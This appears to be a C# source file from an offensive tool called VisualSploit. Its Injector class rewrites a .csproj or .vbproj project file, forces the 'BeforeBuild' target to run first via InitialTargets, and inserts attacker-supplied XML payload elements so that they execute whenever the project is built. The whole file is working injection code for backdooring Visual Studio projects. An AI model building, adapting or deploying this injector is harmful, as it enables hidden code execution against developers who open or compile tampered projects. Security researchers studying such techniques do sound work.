using System.Xml;
using System.Xml.Linq;

namespace VisualSploit;

static class Injector
{
    public static void Inject(string projectPath, string payload, string? output = null, bool backup = true)
    {
        if (!File.Exists(projectPath))
            throw new FileNotFoundException($"Project file not found: {projectPath}");

        var ext = Path.GetExtension(projectPath).ToLowerInvariant();
        if (ext != ".csproj" && ext != ".vbproj")
            throw new ArgumentException("Project file must be .csproj or .vbproj");

        output ??= projectPath;

        if (backup && output == projectPath)
            File.Copy(projectPath, $"{projectPath}.bak", overwrite: true);

        var doc = XDocument.Load(projectPath);
        var root = doc.Root ?? throw new InvalidOperationException("Invalid project file");

        root.SetAttributeValue("InitialTargets", "BeforeBuild");

        var payloadElements = XElement.Parse($"<Root>{payload}</Root>").Elements();

        foreach (var element in payloadElements)
        {
            // Set the namespace to match the project root to avoid xmlns="" attributes
            SetNamespaceRecursive(element, root.Name.Namespace);
            root.Add(element);
        }

        var settings = new XmlWriterSettings
        {
            Indent = true,
            IndentChars = "  ",
            OmitXmlDeclaration = doc.Declaration == null
        };

        using var writer = XmlWriter.Create(output, settings);
        doc.Save(writer);
    }

    private static void SetNamespaceRecursive(XElement element, XNamespace ns)
    {
        element.Name = ns + element.Name.LocalName;
        foreach (var child in element.Elements())
            SetNamespaceRecursive(child, ns);
    }
}
